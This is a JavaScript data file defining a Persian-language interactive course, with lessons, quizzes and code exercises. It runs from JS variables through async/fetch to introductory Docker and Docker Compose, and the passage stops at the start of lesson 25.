const LESSONS = [
    {
        id: 1,
        title: "متغیرها",
        icon: "📦",
        steps: [
            { type: "teach", title: "متغیر چیست؟", content: `<p>متغیر مثل یه جعبه‌ست که می‌تونی توش اطلاعات ذخیره کنی.</p><pre><code>let name = "علی";
const age = 25;
var city = "تهران";</code></pre><p><code>let</code> برای متغیرهایی که مقدارشون عوض میشه</p><p><code>const</code> برای مقادیر ثابت</p><p><code>var</code> روش قدیمی (بهتره استفاده نکنی)</p>` },
            { type: "quiz", title: "کدوم کلمه کلیدی برای مقدار ثابت استفاده میشه؟", options: ["let", "const", "var", "fixed"], correct: 1 },
            { type: "teach", title: "انواع داده‌ها", content: `<p>جاوااسکریپت چند نوع داده اصلی داره:</p><pre><code>let text = "سلام";        // String
let number = 42;          // Number
let isTrue = true;        // Boolean
let empty = null;         // Null
let notDefined;           // Undefined</code></pre>` },
            { type: "quiz", title: "خروجی typeof \"hello\" چیه؟", options: ["number", "string", "boolean", "object"], correct: 1 },
            { type: "code", title: "یه متغیر بساز!", instruction: "یه متغیر به اسم <code>message</code> بساز و مقدارش رو برابر <code>\"سلام دنیا\"</code> قرار بده.", answer: 'let message = "سلام دنیا"', validate: function(code) { return code.includes('let message') && code.includes('"سلام دنیا"'); } }
        ]
    },
    {
        id: 2,
        title: "عملگرها",
        icon: "➕",
        steps: [
            { type: "teach", title: "عملگرهای ریاضی", content: `<pre><code>let a = 10 + 5;   // 15 (جمع)
let b = 10 - 5;   // 5 (تفریق)
let c = 10 * 5;   // 50 (ضرب)
let d = 10 / 5;   // 2 (تقسیم)
let e = 10 % 3;   // 1 (باقیمانده)
let f = 2 ** 3;   // 8 (توان)</code></pre>` },
            { type: "quiz", title: "نتیجه 10 % 3 چیه؟", options: ["3", "1", "0", "3.33"], correct: 1 },
            { type: "teach", title: "عملگرهای مقایسه‌ای", content: `<pre><code>5 == "5"    // true (فقط مقدار)
5 === "5"   // false (مقدار + نوع)
5 != "5"    // false
5 !== "5"   // true
5 > 3       // true
5 <= 5      // true</code></pre><p>همیشه از <code>===</code> استفاده کن</p>` },
            { type: "quiz", title: "نتیجه 5 === \"5\" چیه؟", options: ["true", "false", "undefined", "error"], correct: 1 },
            { type: "code", title: "محاسبه کن!", instruction: "یه متغیر <code>result</code> بساز که حاصل‌ضرب 7 در 8 باشه.", answer: "let result = 7 * 8", validate: function(code) { return code.includes('result') && (code.includes('7 * 8') || code.includes('56')); } }
        ]
    },
    {
        id: 3,
        title: "شرط‌ها",
        icon: "🔀",
        steps: [
            { type: "teach", title: "if / else", content: `<pre><code>let age = 18;

if (age >= 18) {
    console.log("بزرگسال");
} else {
    console.log("نوجوان");
}</code></pre>` },
            { type: "quiz", title: "اگه age = 15 باشه، چی چاپ میشه؟", options: ["بزرگسال", "نوجوان", "error", "undefined"], correct: 1 },
            { type: "teach", title: "else if", content: `<pre><code>let score = 85;

if (score >= 90) {
    console.log("عالی");
} else if (score >= 70) {
    console.log("خوب");
} else if (score >= 50) {
    console.log("قبول");
} else {
    console.log("مردود");
}</code></pre>` },
            { type: "quiz", title: "اگه score = 85 باشه، خروجی چیه؟", options: ["عالی", "خوب", "قبول", "مردود"], correct: 1 },
            { type: "code", title: "شرط بنویس!", instruction: "یه شرط بنویس که اگه <code>x</code> بزرگتر از 10 بود، <code>\"big\"</code> رو console.log کنه.", answer: 'if (x > 10) { console.log("big"); }', validate: function(code) { return code.includes('if') && code.includes('x > 10') && code.includes('console.log'); } }
        ]
    },
    {
        id: 4,
        title: "حلقه‌ها",
        icon: "🔄",
        steps: [
            { type: "teach", title: "حلقه for", content: `<pre><code>for (let i = 0; i < 5; i++) {
    console.log(i);
}
// خروجی: 0, 1, 2, 3, 4</code></pre><p>سه بخش: <code>شروع; شرط; گام</code></p>` },
            { type: "quiz", title: "حلقه for (let i=0; i<3; i++) چند بار اجرا میشه؟", options: ["2 بار", "3 بار", "4 بار", "بی‌نهایت"], correct: 1 },
            { type: "teach", title: "حلقه while", content: `<pre><code>let count = 0;
while (count < 3) {
    console.log(count);
    count++;
}
// خروجی: 0, 1, 2</code></pre><p>⚠️ مراقب حلقه بی‌نهایت باش!</p>` },
            { type: "quiz", title: "کدوم حلقه حداقل یک بار اجرا میشه؟", options: ["for", "while", "do...while", "for...in"], correct: 2 },
            { type: "code", title: "حلقه بنویس!", instruction: "یه حلقه <code>for</code> بنویس که اعداد 1 تا 5 رو چاپ کنه.", answer: 'for (let i = 1; i <= 5; i++) { console.log(i); }', validate: function(code) { return code.includes('for') && code.includes('console.log') && (code.includes('i <= 5') || code.includes('i < 6')); } }
        ]
    },
    {
        id: 5,
        title: "توابع",
        icon: "⚙️",
        steps: [
            { type: "teach", title: "تعریف تابع", content: `<pre><code>function greet(name) {
    return "سلام " + name;
}

let message = greet("علی");
console.log(message); // "سلام علی"</code></pre>` },
            { type: "quiz", title: "کلمه کلیدی برای برگردوندن مقدار از تابع چیه؟", options: ["give", "return", "output", "send"], correct: 1 },
            { type: "teach", title: "Arrow Functions", content: `<pre><code>// تابع معمولی
function add(a, b) { return a + b; }

// Arrow function
const add = (a, b) => a + b;

// با یه پارامتر
const double = x => x * 2;</code></pre>` },
            { type: "quiz", title: "کدوم یه arrow function معتبره؟", options: ["const f = => x + 1", "const f = x => x + 1", "const f = x -> x + 1", "const f => x = x + 1"], correct: 1 },
            { type: "code", title: "تابع بنویس!", instruction: "یه تابع به اسم <code>square</code> بنویس که یه عدد بگیره و مربعش رو برگردونه.", answer: "function square(n) { return n * n; }", validate: function(code) { return code.includes('square') && code.includes('return') && (code.includes('*') || code.includes('**')); } }
        ]
    },
    {
        id: 6,
        title: "آرایه‌ها",
        icon: "📋",
        steps: [
            { type: "teach", title: "آرایه چیست؟", content: `<pre><code>let fruits = ["سیب", "موز", "پرتقال"];
console.log(fruits[0]);     // "سیب"
console.log(fruits.length); // 3</code></pre><p>ایندکس از 0 شروع میشه!</p>` },
            { type: "quiz", title: "ایندکس اولین عنصر آرایه چنده؟", options: ["1", "0", "-1", "first"], correct: 1 },
            { type: "teach", title: "متدهای آرایه", content: `<pre><code>let arr = [1, 2, 3];
arr.push(4);    // اضافه به آخر
arr.pop();      // حذف از آخر
arr.map(x => x * 2);     // [2,4,6]
arr.filter(x => x > 1);  // [2,3]
arr.find(x => x === 2);  // 2
arr.reduce((sum, x) => sum + x, 0); // 6</code></pre>` },
            { type: "quiz", title: "arr.push(5) چیکار می‌کنه؟", options: ["5 رو به اول اضافه می‌کنه", "5 رو به آخر اضافه می‌کنه", "عنصر 5ام رو حذف می‌کنه", "آرایه رو 5 برابر می‌کنه"], correct: 1 },
            { type: "code", title: "با آرایه کار کن!", instruction: "یه آرایه <code>numbers</code> بساز با مقادیر 1, 2, 3 و بعد عدد 4 رو بهش اضافه کن.", answer: 'let numbers = [1, 2, 3]; numbers.push(4);', validate: function(code) { return code.includes('numbers') && code.includes('[1') && code.includes('push(4)'); } }
        ]
    },
    {
        id: 7,
        title: "آبجکت‌ها",
        icon: "🏗️",
        steps: [
            { type: "teach", title: "آبجکت چیست؟", content: `<pre><code>let person = {
    name: "علی",
    age: 25,
    city: "تهران"
};
console.log(person.name);    // "علی"
console.log(person["age"]);  // 25</code></pre>` },
            { type: "quiz", title: "کدوم روش دسترسی به property درسته؟", options: ["person->name", "person.name", "person::name", "person@name"], correct: 1 },
            { type: "teach", title: "متدهای آبجکت", content: `<pre><code>let calc = {
    add(a, b) { return a + b; },
    subtract(a, b) { return a - b; }
};
Object.keys(person);   // ["name","age","city"]
Object.values(person); // ["علی",25,"تهران"]
Object.entries(person); // [["name","علی"],...]</code></pre>` },
            { type: "quiz", title: "Object.keys({a:1, b:2}) چی برمی‌گردونه؟", options: ['[1, 2]', '["a", "b"]', '{a, b}', '["a:1", "b:2"]'], correct: 1 },
            { type: "code", title: "آبجکت بساز!", instruction: "یه آبجکت <code>car</code> بساز با propertyهای <code>brand</code> و <code>year</code>.", answer: 'let car = { brand: "Toyota", year: 2020 };', validate: function(code) { return code.includes('car') && code.includes('brand') && code.includes('year'); } }
        ]
    },
    {
        id: 8,
        title: "DOM",
        icon: "🌐",
        steps: [
            { type: "teach", title: "DOM چیست؟", content: `<p>DOM نمایش صفحه وب به صورت درختیه:</p><pre><code>let el = document.getElementById("title");
let els = document.querySelectorAll(".btn");
el.textContent = "عنوان جدید";
el.style.color = "red";</code></pre>` },
            { type: "quiz", title: "کدوم متد یه عنصر با id رو انتخاب می‌کنه؟", options: ["document.querySelector()", "document.getElementById()", "document.getElement()", "document.findById()"], correct: 1 },
            { type: "teach", title: "رویدادها (Events)", content: `<pre><code>let btn = document.getElementById("myBtn");

btn.addEventListener("click", () => {
    console.log("کلیک شد!");
});</code></pre>` },
            { type: "quiz", title: "کدوم event وقتی کاربر کلیک می‌کنه فعال میشه؟", options: ["hover", "click", "press", "tap"], correct: 1 },
            { type: "code", title: "DOM رو تغییر بده!", instruction: "متن عنصر با id برابر <code>\"title\"</code> رو به <code>\"سلام\"</code> تغییر بده.", answer: 'document.getElementById("title").textContent = "سلام";', validate: function(code) { return code.includes('getElementById') && code.includes('title') && code.includes('سلام'); } }
        ]
    },
    {
        id: 9,
        title: "متدهای رشته",
        icon: "🔤",
        steps: [
            { type: "teach", title: "String Methods", content: `<pre><code>let str = "Hello World";
str.length;            // 11
str.toUpperCase();     // "HELLO WORLD"
str.toLowerCase();     // "hello world"
str.includes("World"); // true
str.slice(0, 5);       // "Hello"
str.split(" ");        // ["Hello", "World"]
str.replace("World", "JS"); // "Hello JS"
str.trim();            // حذف فاصله اول و آخر</code></pre>` },
            { type: "quiz", title: '"Hello".toUpperCase() چی برمی‌گردونه؟', options: ['"hello"', '"HELLO"', '"Hello"', 'error'], correct: 1 },
            { type: "teach", title: "Template Literals", content: '<p>روش مدرن ساخت رشته:</p><pre><code>let name = "علی";\nlet age = 25;\nlet msg = \\`سلام ${name}، سنت ${age} ساله\\`;</code></pre>' },
            { type: "quiz", title: "Template literal با چه کاراکتری نوشته میشه؟", options: ["' '", '" "', "` `", "( )"], correct: 2 },
            { type: "code", title: "Template literal بنویس!", instruction: "یه متغیر با template literal بساز که اسم رو داخلش بذاره.", answer: 'let greeting = `سلام ${name}`;', validate: function(code) { return code.includes('`') && code.includes('${'); } }
        ]
    },
    {
        id: 10,
        title: "Scope و Closure",
        icon: "🔒",
        steps: [
            { type: "teach", title: "Scope چیست؟", content: `<p>Scope تعیین می‌کنه متغیر کجا قابل دسترسیه:</p><pre><code>let global = "همه جا";

function myFunc() {
    let local = "فقط اینجا";
    console.log(global); // ✓
}
console.log(local); // ✗ Error!</code></pre><p><code>let</code> و <code>const</code> block scope دارن.</p>` },
            { type: "quiz", title: "متغیر let داخل if، بیرون if قابل دسترسیه؟", options: ["بله", "خیر", "بستگی داره", "فقط با var"], correct: 1 },
            { type: "teach", title: "Closure", content: `<p>تابع داخلی به متغیرهای بیرونی دسترسی داره:</p><pre><code>function counter() {
    let count = 0;
    return function() {
        count++;
        return count;
    };
}
const inc = counter();
inc(); // 1
inc(); // 2</code></pre>` },
            { type: "quiz", title: "Closure چیه؟", options: ["یه نوع حلقه", "تابعی که به scope بیرونیش دسترسی داره", "روش حذف متغیر", "یه نوع error"], correct: 1 },
            { type: "code", title: "Closure بساز!", instruction: "یه تابع <code>makeAdder</code> بنویس که عدد x بگیره و تابعی برگردونه که x رو به ورودیش اضافه کنه.", answer: "function makeAdder(x) { return function(y) { return x + y; }; }", validate: function(code) { return code.includes('makeAdder') && code.includes('return') && code.includes('function'); } }
        ]
    },
    {
        id: 11,
        title: "this keyword",
        icon: "👆",
        steps: [
            { type: "teach", title: "this چیست؟", content: `<p><code>this</code> به آبجکتی اشاره می‌کنه که تابع روش صدا زده شده:</p><pre><code>const person = {
    name: "علی",
    greet() {
        console.log("سلام " + this.name);
    }
};
person.greet(); // "سلام علی"

// در arrow function، this از scope بیرونی میاد
const obj = {
    name: "علی",
    greet: () => {
        console.log(this.name); // undefined!
    }
};</code></pre>` },
            { type: "quiz", title: "this در arrow function از کجا میاد؟", options: ["خود آبجکت", "scope بیرونی", "window", "undefined همیشه"], correct: 1 },
            { type: "teach", title: "bind, call, apply", content: `<pre><code>function greet(greeting) {
    console.log(greeting + " " + this.name);
}

const user = { name: "علی" };

greet.call(user, "سلام");   // "سلام علی"
greet.apply(user, ["سلام"]); // "سلام علی"

const bound = greet.bind(user);
bound("سلام"); // "سلام علی"</code></pre>` },
            { type: "quiz", title: "bind چیکار می‌کنه؟", options: ["تابع رو اجرا می‌کنه", "یه تابع جدید با this ثابت برمی‌گردونه", "this رو حذف می‌کنه", "متغیر می‌سازه"], correct: 1 },
            { type: "code", title: "this استفاده کن!", instruction: "یه آبجکت با متد <code>sayHi</code> بساز که <code>this.name</code> رو چاپ کنه.", answer: 'const obj = { name: "علی", sayHi() { console.log(this.name); } };', validate: function(code) { return code.includes('this.name') && code.includes('console.log'); } }
        ]
    },
    {
        id: 12,
        title: "Async/Await",
        icon: "⏳",
        steps: [
            { type: "teach", title: "Promise چیست؟", content: `<p>Promise نمایانگر یه عملیات آینده‌ست:</p><pre><code>const promise = new Promise((resolve, reject) => {
    setTimeout(() => resolve("تموم شد!"), 1000);
});

promise
    .then(result => console.log(result))
    .catch(error => console.log(error));</code></pre><p>سه حالت: pending، fulfilled، rejected</p>` },
            { type: "quiz", title: "Promise در ابتدا چه وضعیتی داره؟", options: ["fulfilled", "rejected", "pending", "resolved"], correct: 2 },
            { type: "teach", title: "async/await", content: `<pre><code>async function fetchData() {
    try {
        const response = await fetch("https://api.example.com/data");
        const data = await response.json();
        return data;
    } catch (error) {
        console.log("خطا:", error);
    }
}</code></pre><p><code>await</code> فقط داخل تابع <code>async</code> کار می‌کنه.</p>` },
            { type: "quiz", title: "await کجا قابل استفاده‌ست؟", options: ["همه جا", "فقط داخل تابع async", "فقط داخل Promise", "فقط top-level"], correct: 1 },
            { type: "code", title: "async function بنویس!", instruction: "یه تابع async بنویس که با await fetch از یه URL داده بگیره.", answer: 'async function getData() { const res = await fetch("url"); }', validate: function(code) { return code.includes('async') && code.includes('await') && code.includes('fetch'); } }
        ]
    },
    {
        id: 13,
        title: "Error Handling",
        icon: "🛡️",
        steps: [
            { type: "teach", title: "try/catch", content: `<pre><code>try {
    let result = riskyFunction();
    console.log(result);
} catch (error) {
    console.log("خطا:", error.message);
} finally {
    console.log("همیشه اجرا میشه");
}</code></pre>` },
            { type: "quiz", title: "بلاک finally کی اجرا میشه؟", options: ["فقط وقتی خطا بده", "فقط وقتی خطا نده", "همیشه", "هیچوقت"], correct: 2 },
            { type: "teach", title: "throw و Custom Error", content: `<pre><code>function divide(a, b) {
    if (b === 0) throw new Error("تقسیم بر صفر!");
    return a / b;
}

try {
    divide(10, 0);
} catch (e) {
    console.log(e.message); // "تقسیم بر صفر!"
}</code></pre>` },
            { type: "quiz", title: "با چه کلمه‌ای خطا پرتاب می‌کنیم؟", options: ["error", "throw", "catch", "raise"], correct: 1 },
            { type: "code", title: "Error handling بنویس!", instruction: "یه بلاک try/catch بنویس که JSON.parse رو صدا بزنه.", answer: 'try { JSON.parse(text); } catch (e) { console.log(e.message); }', validate: function(code) { return code.includes('try') && code.includes('catch') && code.includes('JSON.parse'); } }
        ]
    },
    {
        id: 14,
        title: "Classes",
        icon: "🎓",
        steps: [
            { type: "teach", title: "Class چیست؟", content: `<pre><code>class Animal {
    constructor(name, sound) {
        this.name = name;
        this.sound = sound;
    }
    speak() {
        return this.name + " میگه " + this.sound;
    }
}
const cat = new Animal("گربه", "میو");
cat.speak(); // "گربه میگه میو"</code></pre>` },
            { type: "quiz", title: "constructor کی اجرا میشه؟", options: ["وقتی متد صدا بزنیم", "وقتی new بزنیم", "وقتی class تعریف بشه", "هیچوقت خودکار نیست"], correct: 1 },
            { type: "teach", title: "وراثت (Inheritance)", content: `<pre><code>class Dog extends Animal {
    constructor(name) {
        super(name, "هاپ");
    }
    fetch() {
        return this.name + " توپ میاره";
    }
}
const dog = new Dog("رکس");
dog.speak(); // "رکس میگه هاپ"</code></pre>` },
            { type: "quiz", title: "super() چیکار می‌کنه؟", options: ["class جدید می‌سازه", "constructor والد رو صدا می‌زنه", "class رو حذف می‌کنه", "متد static می‌سازه"], correct: 1 },
            { type: "code", title: "Class بساز!", instruction: "یه class <code>Person</code> بساز با constructor که name و age بگیره.", answer: 'class Person { constructor(name, age) { this.name = name; this.age = age; } }', validate: function(code) { return code.includes('class Person') && code.includes('constructor') && code.includes('this.'); } }
        ]
    },
    {
        id: 15,
        title: "Destructuring",
        icon: "📤",
        steps: [
            { type: "teach", title: "Object Destructuring", content: `<pre><code>const person = { name: "علی", age: 25, city: "تهران" };

// Destructuring
const { name, age, city } = person;

// با نام جدید
const { name: fullName } = person;

// مقدار پیش‌فرض
const { country = "ایران" } = person;</code></pre>` },
            { type: "quiz", title: "const { x, y } = obj; یعنی چی؟", options: ["ساخت آبجکت جدید", "استخراج x و y از obj", "حذف x و y", "کپی obj"], correct: 1 },
            { type: "teach", title: "Array Destructuring و Spread", content: `<pre><code>const [first, second, ...rest] = [1, 2, 3, 4, 5];
// first=1, second=2, rest=[3,4,5]

// Spread
const arr2 = [...arr1, 4, 5];
const obj2 = { ...obj1, c: 3 };</code></pre>` },
            { type: "quiz", title: "...rest چیکار می‌کنه؟", options: ["خطا میده", "بقیه عناصر رو جمع می‌کنه", "آرایه رو خالی می‌کنه", "اولی رو می‌گیره"], correct: 1 },
            { type: "code", title: "Destructure کن!", instruction: "از آبجکت <code>{name: \"علی\", age: 25}</code> مقادیر name و age رو استخراج کن.", answer: 'const { name, age } = { name: "علی", age: 25 };', validate: function(code) { return code.includes('{') && code.includes('name') && code.includes('age') && code.includes('='); } }
        ]
    },
    {
        id: 16,
        title: "Modules",
        icon: "📁",
        steps: [
            { type: "teach", title: "Export و Import", content: `<pre><code>// math.js
export function add(a, b) { return a + b; }
export const PI = 3.14;

// app.js
import { add, PI } from './math.js';

// Default export
export default class Calculator { }
import Calculator from './Calculator.js';</code></pre>` },
            { type: "quiz", title: "برای استفاده از تابع فایل دیگه چیکار می‌کنیم؟", options: ["require", "import", "include", "load"], correct: 1 },
            { type: "teach", title: "Named vs Default", content: `<p>هر فایل فقط یه default export داره ولی چندین named export:</p><pre><code>// Named: باید با {} ایمپورت بشه
import { add, sub } from './math.js';

// Default: بدون {} و اسم آزاد
import MyCalc from './Calculator.js';

// ترکیبی
import Calc, { PI } from './math.js';</code></pre>` },
            { type: "quiz", title: "default export چطور import میشه؟", options: ["با {}", "بدون {} و اسم آزاد", "با * as", "فقط require"], correct: 1 },
            { type: "code", title: "Export بنویس!", instruction: "یه تابع multiply بنویس و exportش کن.", answer: 'export function multiply(a, b) { return a * b; }', validate: function(code) { return code.includes('export') && code.includes('multiply') && code.includes('return'); } }
        ]
    },
    {
        id: 17,
        title: "Fetch API",
        icon: "🌍",
        steps: [
            { type: "teach", title: "دریافت داده از سرور", content: `<pre><code>// GET
const res = await fetch("https://api.example.com/users");
const data = await res.json();

// POST
await fetch("/api/users", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "علی" })
});</code></pre>` },
            { type: "quiz", title: "response.json() چیکار می‌کنه؟", options: ["JSON → string", "response → آبجکت JS", "فایل JSON می‌سازه", "خطا میده"], correct: 1 },
            { type: "teach", title: "Error handling در fetch", content: `<pre><code>async function fetchData(url) {
    try {
        const res = await fetch(url);
        if (!res.ok) throw new Error("HTTP " + res.status);
        return await res.json();
    } catch (err) {
        console.log("خطا:", err.message);
    }
}</code></pre><p>⚠️ fetch فقط در خطای شبکه reject میشه، نه 404!</p>` },
            { type: "quiz", title: "fetch کی خودش error میده؟", options: ["404", "500", "خطای شبکه", "همه موارد"], correct: 2 },
            { type: "code", title: "Fetch بنویس!", instruction: "یه تابع async بنویس که fetch کنه و response.json() رو return کنه.", answer: 'async function getData(url) { const res = await fetch(url); return await res.json(); }', validate: function(code) { return code.includes('async') && code.includes('fetch') && code.includes('json()'); } }
        ]
    },
    {
        id: 18,
        title: "Higher Order Functions",
        icon: "🎯",
        steps: [
            { type: "teach", title: "map, filter, reduce", content: `<pre><code>const nums = [1, 2, 3, 4, 5];

// map: تبدیل هر عنصر
nums.map(x => x * 2); // [2,4,6,8,10]

// filter: فیلتر کردن
nums.filter(x => x > 3); // [4,5]

// reduce: خلاصه کردن به یه مقدار
nums.reduce((sum, x) => sum + x, 0); // 15

// ترکیبی
nums.filter(x => x % 2 === 0).map(x => x * 10); // [20,40]</code></pre>` },
            { type: "quiz", title: "reduce چیکار می‌کنه؟", options: ["آرایه رو کوچیک می‌کنه", "آرایه رو به یه مقدار تبدیل می‌کنه", "عناصر رو حذف می‌کنه", "مرتب می‌کنه"], correct: 1 },
            { type: "teach", title: "every, some, find", content: `<pre><code>const nums = [1, 2, 3, 4, 5];

nums.every(x => x > 0);  // true (همه مثبتن)
nums.some(x => x > 4);   // true (حداقل یکی > 4)
nums.find(x => x > 3);   // 4 (اولین مورد)
nums.findIndex(x => x > 3); // 3 (ایندکس اولین)

// sort
nums.sort((a, b) => b - a); // [5,4,3,2,1] نزولی</code></pre>` },
            { type: "quiz", title: "every vs some: کدوم فقط یه true کافیه؟", options: ["every", "some", "هر دو", "هیچکدوم"], correct: 1 },
            { type: "code", title: "reduce بنویس!", instruction: "با reduce مجموع آرایه <code>[1,2,3,4]</code> رو حساب کن.", answer: '[1,2,3,4].reduce((sum, x) => sum + x, 0);', validate: function(code) { return code.includes('reduce') && code.includes('+'); } }
        ]
    },
    {
        id: 19,
        title: "Map و Set",
        icon: "🗺️",
        steps: [
            { type: "teach", title: "Map", content: `<pre><code>const map = new Map();
map.set("name", "علی");
map.set(1, "عدد");
map.get("name"); // "علی"
map.has("name"); // true
map.size;        // 2
map.delete("name");

map.forEach((val, key) => console.log(key, val));</code></pre><p>key هر نوعی می‌تونه باشه (برخلاف Object).</p>` },
            { type: "quiz", title: "تفاوت Map با Object؟", options: ["فرقی ندارن", "key در Map هر نوعی میشه", "Map سریع‌تره", "Object بیشتر جا می‌گیره"], correct: 1 },
            { type: "teach", title: "Set", content: `<pre><code>const set = new Set([1, 2, 3, 3, 3]);
set.size; // 3 (تکراری حذف شد)
set.add(4);
set.has(2); // true

// حذف تکراری از آرایه
const unique = [...new Set([1,1,2,2,3])]; // [1,2,3]</code></pre>` },
            { type: "quiz", title: "new Set([1,1,2,2,3]).size چنده؟", options: ["5", "3", "2", "1"], correct: 1 },
            { type: "code", title: "Set بساز!", instruction: "تکراری‌های آرایه <code>[1,2,2,3,3]</code> رو با Set حذف کن.", answer: 'const unique = [...new Set([1,2,2,3,3])];', validate: function(code) { return code.includes('new Set') && code.includes('['); } }
        ]
    },
    {
        id: 20,
        title: "Event Loop",
        icon: "♻️",
        steps: [
            { type: "teach", title: "Event Loop", content: `<p>JS single-threaded ه ولی با Event Loop async کار می‌کنه:</p><pre><code>console.log("1");
setTimeout(() => console.log("2"), 0);
Promise.resolve().then(() => console.log("3"));
console.log("4");

// خروجی: 1, 4, 3, 2</code></pre><p>ترتیب: Call Stack → Microtasks (Promise) → Macrotasks (setTimeout)</p>` },
            { type: "quiz", title: "کدوم اول اجرا میشه: setTimeout(fn,0) یا Promise.then(fn)؟", options: ["setTimeout", "Promise", "همزمان", "تصادفی"], correct: 1 },
            { type: "teach", title: "Microtask vs Macrotask", content: `<pre><code>// Microtasks (اولویت بالا):
// Promise.then, queueMicrotask, MutationObserver

// Macrotasks:
// setTimeout, setInterval, I/O

queueMicrotask(() => console.log("micro"));
setTimeout(() => console.log("macro"), 0);
// خروجی: "micro" بعد "macro"</code></pre>` },
            { type: "quiz", title: "Microtask اولویتش از Macrotask...؟", options: ["کمتره", "بیشتره", "برابره", "بستگی داره"], correct: 1 },
            { type: "code", title: "ترتیب اجرا!", instruction: "کدی بنویس که اول \"start\" بعد با setTimeout \"end\" رو چاپ کنه.", answer: 'console.log("start"); setTimeout(() => console.log("end"), 0);', validate: function(code) { return code.includes('console.log') && code.includes('setTimeout'); } }
        ]
    },
    {
        id: 21,
        title: "LocalStorage و JSON",
        icon: "💾",
        steps: [
            { type: "teach", title: "LocalStorage", content: `<pre><code>localStorage.setItem("name", "علی");
localStorage.getItem("name"); // "علی"
localStorage.removeItem("name");
localStorage.clear();

// ذخیره آبجکت
const user = { name: "علی", age: 25 };
localStorage.setItem("user", JSON.stringify(user));
const saved = JSON.parse(localStorage.getItem("user"));</code></pre><p>⚠️ فقط string ذخیره می‌کنه!</p>` },
            { type: "quiz", title: "localStorage چه نوعی ذخیره می‌کنه؟", options: ["هر نوعی", "فقط string", "فقط number", "فقط object"], correct: 1 },
            { type: "teach", title: "JSON", content: `<pre><code>// String → Object
const obj = JSON.parse('{"name":"علی"}');

// Object → String
const str = JSON.stringify({ name: "علی" });

// Pretty print
JSON.stringify(obj, null, 2);</code></pre><p>⚠️ keyها باید "" داشته باشن. trailing comma مجاز نیست.</p>` },
            { type: "quiz", title: "JSON.parse() چیکار می‌کنه؟", options: ["Object → String", "String → Object", "Object → Array", "String → Number"], correct: 1 },
            { type: "code", title: "ذخیره کن!", instruction: "یه آبجکت رو با JSON.stringify در localStorage ذخیره کن.", answer: 'localStorage.setItem("data", JSON.stringify({a: 1}));', validate: function(code) { return code.includes('localStorage.setItem') && code.includes('JSON.stringify'); } }
        ]
    },
    {
        id: 22,
        title: "Optional Chaining",
        icon: "❓",
        steps: [
            { type: "teach", title: "?. و ??", content: `<p>برای دسترسی امن به propertyهای تو در تو:</p><pre><code>const user = { address: { city: "تهران" } };

// بدون optional chaining
const city = user && user.address && user.address.city;

// با optional chaining
const city = user?.address?.city; // "تهران"
const zip = user?.address?.zip;   // undefined (بدون error)

// Nullish Coalescing
const name = null ?? "پیش‌فرض"; // "پیش‌فرض"
const zero = 0 ?? 42;           // 0 (فقط null/undefined)
const empty = 0 || 42;          // 42 (falsy values)</code></pre>` },
            { type: "quiz", title: "null ?? 'hi' چی میده؟", options: ["null", "'hi'", "undefined", "error"], correct: 1 },
            { type: "teach", title: "کاربردهای بیشتر", content: `<pre><code>// Optional method call
obj.method?.();

// Optional array access
arr?.[0];

// ترکیب با ??
const name = user?.profile?.name ?? "ناشناس";

// در شرط
if (user?.isAdmin) {
    // ...
}</code></pre>` },
            { type: "quiz", title: "0 || 'default' vs 0 ?? 'default' - تفاوت؟", options: ["فرقی ندارن", "|| هر falsy رو می‌گیره، ?? فقط null/undefined", "?? سریع‌تره", "|| جدیدتره"], correct: 1 },
            { type: "code", title: "Optional chaining بنویس!", instruction: "با ?. به property <code>user.address.city</code> دسترسی پیدا کن.", answer: 'const city = user?.address?.city;', validate: function(code) { return code.includes('?.'); } }
        ]
    },
    {
        id: 23,
        title: "Docker مقدماتی",
        icon: "🐳",
        steps: [
            { type: "teach", title: "Docker چیست؟", content: `<p>Docker ابزاریه که اپلیکیشنت رو با تمام وابستگی‌هاش توی یه container بسته‌بندی می‌کنه:</p><pre><code># مفاهیم اصلی:
# Image: قالب (مثل class)
# Container: نمونه در حال اجرا (مثل object)
# Dockerfile: دستورالعمل ساخت image
# Volume: ذخیره دائمی داده
# Network: ارتباط بین containerها

# دستورات پایه
docker pull nginx          # دانلود image
docker run -d nginx        # اجرای container
docker ps                  # لیست containerها
docker stop [id]           # توقف
docker rm [id]             # حذف</code></pre>` },
            { type: "quiz", title: "تفاوت Image و Container چیه؟", options: ["فرقی ندارن", "Image قالبه، Container نمونه اجراییه", "Container قالبه", "Image فقط لینوکسه"], correct: 1 },
            { type: "teach", title: "Dockerfile", content: `<pre><code># Dockerfile برای یه اپ Node.js
FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

EXPOSE 3000

CMD ["node", "server.js"]</code></pre><p>هر خط یه layer می‌سازه. ترتیب مهمه برای cache!</p>` },
            { type: "quiz", title: "FROM توی Dockerfile چیکار می‌کنه؟", options: ["فایل کپی می‌کنه", "base image رو مشخص می‌کنه", "پورت باز می‌کنه", "دستور اجرا می‌کنه"], correct: 1 },
            { type: "code", title: "Dockerfile بنویس!", instruction: "یه Dockerfile بنویس که از <code>node:18-alpine</code> شروع کنه و <code>WORKDIR /app</code> ست کنه.", answer: 'FROM node:18-alpine\nWORKDIR /app', validate: function(code) { return code.includes('FROM') && code.includes('node') && code.includes('WORKDIR'); } }
        ]
    },
    {
        id: 24,
        title: "Docker Compose",
        icon: "🐙",
        steps: [
            { type: "teach", title: "docker-compose.yml", content: `<p>برای اجرای چند container با هم:</p><pre><code>version: '3.8'
services:
  app:
    build: .
    ports:
      - "3000:3000"
    depends_on:
      - db
    environment:
      - DB_HOST=db

  db:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - mongo-data:/data/db

volumes:
  mongo-data:</code></pre>` },
            { type: "quiz", title: "depends_on چیکار می‌کنه؟", options: ["پورت باز می‌کنه", "ترتیب اجرا رو مشخص می‌کنه", "volume می‌سازه", "image می‌سازه"], correct: 1 },
            { type: "teach", title: "دستورات Compose", content: `<pre><code># اجرا
docker-compose up -d

# توقف
docker-compose down

# لاگ‌ها
docker-compose logs -f app

# ری‌بیلد
docker-compose up --build

# اجرای دستور داخل container
docker-compose exec app sh</code></pre>` },
            { type: "quiz", title: "docker-compose up -d یعنی چی؟", options: ["حذف containerها", "اجرا در background", "فقط build", "نمایش لاگ"], correct: 1 },
            { type: "code", title: "Compose بنویس!", instruction: "یه service به اسم <code>web</code> بنویس که از image nginx استفاده کنه و پورت 80 رو map کنه.", answer: 'services:\n  web:\n    image: nginx\n    ports:\n      - "80:80"', validate: function(code) { return code.includes('web') && code.includes('nginx') && code.includes('80'); } }
        ]
    },
    {
        id: 25,
        title: "Docker شبکه و Volume",
